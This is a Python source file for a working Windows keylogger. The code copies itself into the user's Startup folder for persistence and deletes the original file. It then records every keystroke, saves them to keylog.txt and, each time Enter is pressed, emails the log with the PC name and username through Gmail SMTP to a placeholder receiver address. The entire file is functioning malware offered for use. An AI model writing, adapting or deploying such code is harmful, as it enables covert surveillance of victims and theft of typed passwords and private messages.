import keyboard
import pyautogui
import os
import smtplib
import ssl
from email.message import EmailMessage
import getpass
import shutil
import sys
import socket

def check_and_copy_to_startup():
    if getattr(sys, 'frozen', False):
        script_path = sys.executable
    else:
        script_path = os.path.abspath(__file__)
        
    username = getpass.getuser()
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_name = os.path.basename(script_path)

    script_in_startup = os.path.join(startup_folder, script_name)

    running_script_directory = os.path.dirname(script_path)
    is_running_from_startup = running_script_directory.lower() == startup_folder.lower()

    if os.path.exists(script_in_startup):
        if not is_running_from_startup:
            os.startfile(script_in_startup)
    else:
        shutil.copy(script_path, startup_folder)
        if not is_running_from_startup:
            os.remove(script_path)
        os.startfile(os.path.join(startup_folder, script_name))

def save_keypress_to_notepad_and_send_email():
    keys = []

    while True:
        event = keyboard.read_event(suppress=False)
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name

            if key == "enter":
                save_to_notepad(keys)
                send_email()
                keys = []

            keys.append(key)

def save_to_notepad(keys):
    current_directory = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_directory, "keylog.txt")

    with open(file_path, "w") as file:
        file.write("\n".join(keys))

def send_email():
    user_email = "sender@mail.com"
    user_email_password = "XXXX XXXX XXXX XXXX" #Replace Your App Password
    receiver_email = "receiver@mail.com"
    specified_file_name = "keylog.txt"
    pc_name = socket.gethostname()
    username = getpass.getuser()
    subject = f"Keypress Log - PC Name: {pc_name} - User: {username}"

    current_directory = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_directory, specified_file_name)

    if os.path.exists(file_path):
        em = EmailMessage()
        em['From'] = user_email
        em['To'] = receiver_email
        em['Subject'] = subject

        with open(file_path, 'r') as file:
            content = file.read()

        if content.strip():
            em.set_content("See attached log file.")
            em.add_attachment(content, filename=specified_file_name)

            context = ssl.create_default_context()
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as sm:
                sm.login(user_email, user_email_password)
                sm.send_message(em)

            os.remove(file_path)
    else:
        pass

if __name__ == "__main__":
    check_and_copy_to_startup()
    save_keypress_to_notepad_and_send_email()